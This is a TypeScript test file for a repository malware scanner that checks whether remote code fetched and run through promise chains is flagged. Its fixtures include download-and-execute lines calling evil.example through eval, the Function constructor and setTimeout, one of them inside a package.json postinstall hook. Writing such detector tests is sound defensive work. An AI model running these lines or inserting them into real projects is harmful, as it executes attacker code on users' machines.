import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

/**
 * PRD section 8 requires the bounded malicious-code scan to flag unsafe
 * execution. The fetched-code rule reads the direct forms — the fetch
 * nested inside `eval(...)`, or awaited into it. A promise chain hands
 * the same response text to the executor as a callback instead, and
 * matched nothing: the download was collected, the execution invisible.
 */
function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

function categories(inspection: ReturnType<typeof inspected>) {
  return inspection.findings.map(
    (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
  );
}

const CHAINED: Record<string, string> = {
  "the response text passed straight to eval as the callback":
    "fetch('https://evil.example/x.js').then((r) => r.text()).then(eval)\n",
  "an arrow callback evaluating its parameter":
    "fetch('https://evil.example/x.js').then((r) => r.text()).then((t) => eval(t))\n",
  "a chain split across lines, with another parameter name":
    "fetch('https://evil.example/x.js')\n  .then((res) => res.text())\n  .then((code) => eval(code));\n",
  "the fetched text run through the Function constructor":
    "fetch('https://evil.example/x.js').then((r) => r.text()).then((t) => new Function(t)())\n",
  "a function-expression callback evaluating its parameter":
    "fetch('https://evil.example/x.js').then((r) => r.text()).then(function(t){ return eval(t); })\n",
  "an async function-expression callback evaluating its parameter":
    "fetch('https://evil.example/x.js').then((r) => r.text()).then(async function(t){ return eval(t); })\n",
  "a named function-expression callback evaluating its parameter":
    "fetch('https://evil.example/x.js').then((r) => r.text()).then(function load(t){ return eval(t); })\n",
  "the fetched text as the Function constructor's body argument, invoked":
    "fetch('https://evil.example/x.js').then((r) => r.text()).then((t) => new Function('x', t)())\n",
  "bare Function as the callback":
    "fetch('https://evil.example/x.js').then((r) => r.text()).then(Function)\n",
  "the fetched text handed to setTimeout as a string":
    "fetch('https://evil.example/x.js').then((r) => r.text()).then((t) => setTimeout(t, 0))\n",
  "indirect eval of the fetched text":
    "fetch('https://evil.example/x.js').then((r) => r.text()).then((t) => (0, eval)(t))\n",
  "a block body returning the eval":
    "fetch('https://evil.example/x.js').then((r) => r.text()).then((t) => { return eval(t); })\n",
};

test("code fetched from the network and executed through a promise chain is unsafe execution", () => {
  for (const [name, body] of Object.entries(CHAINED)) {
    expect({
      name,
      findings: categories(inspected("tools/setup.js", body)),
    }).toEqual({
      name,
      findings: ["tools/setup.js:unsafe-execution:high"],
    });
  }
});

test("a chained payload in an install hook is install content", () => {
  const inspection = inspected(
    "package.json",
    '{"scripts":{"postinstall":"node -e \\"fetch(\'https://evil.example/x.js\').then(r=>r.text()).then(eval)\\""}}\n',
  );
  expect(categories(inspection)).toEqual([
    "package.json:unsafe-execution:high",
    "package.json#scripts:unsafe-execution:high",
  ]);
});

test("fetched data that is not executed keeps no finding", () => {
  for (const body of [
    // The chain ends in rendering, logging or assignment, not an executor.
    "fetch('https://example.com/data.json').then((r) => r.json()).then((d) => render(d))\n",
    "fetch('https://example.com/readme.txt').then((r) => r.text()).then((t) => console.log(t))\n",
    "fetch('https://example.com/title.txt').then((r) => r.text()).then((t) => { document.title = t; })\n",
    // A JSON result is data; evaluating it runs no fetched code.
    "fetch('https://example.com/data.json').then((r) => r.json()).then(eval)\n",
    // A name that merely contains the executor's name is not the executor.
    "fetch('https://example.com/x.txt').then((r) => r.text()).then(evaluate)\n",
    // A function-expression callback that only renders the text.
    "fetch('https://example.com/x.txt').then((r) => r.text()).then(function(t){ return console.log(t); })\n",
    // Constructing a Function without calling it executes nothing.
    "fetch('https://example.com/x.txt').then((r) => r.text()).then((t) => new Function('x', t))\n",
    // setTimeout with a function wraps the text; it does not run it.
    "fetch('https://example.com/x.txt').then((r) => r.text()).then((t) => setTimeout(() => show(t), 0))\n",
  ]) {
    expect({
      body,
      findings: categories(inspected("tools/setup.js", body)),
    }).toEqual({
      body,
      findings: [],
    });
  }
});

test("a transformation or property of the fetched text stays with source review", () => {
  for (const body of [
    // Only a property of the chain value reaches the executor.
    "fetch('https://example.com/x.txt').then((r) => r.text()).then((t) => eval(t.length))\n",
    // The executor's argument is a literal; the text is a later argument.
    "fetch('https://example.com/x.txt').then((r) => r.text()).then((t) => new Function('x', t.length))\n",
    // The same property boundary inside a function-expression callback.
    "fetch('https://example.com/x.txt').then((r) => r.text()).then(function(t){ return eval(t.length); })\n",
    // An axios response object is not the response text itself.
    "axios.get('https://example.com/x.js').then((r) => eval(r.data))\n",
  ]) {
    expect({
      body,
      findings: categories(inspected("tools/setup.js", body)),
    }).toEqual({
      body,
      findings: [],
    });
  }
});

test("an executor in a later statement is not linked to the fetch", () => {
  for (const body of [
    // The chain value is local: no fetch anywhere.
    "Promise.resolve(localCode).then(eval)\n",
    "const code = 'console.log(1)';\neval(code);\n",
    // The fetch statement has ended; the eval belongs to another promise.
    "fetch('https://example.com/x.txt').then((r) => r.text()).then((t) => console.log(t)); Promise.resolve(localCode).then(eval)\n",
  ]) {
    expect({
      body,
      findings: categories(inspected("tools/setup.js", body)),
    }).toEqual({
      body,
      findings: [],
    });
  }
});
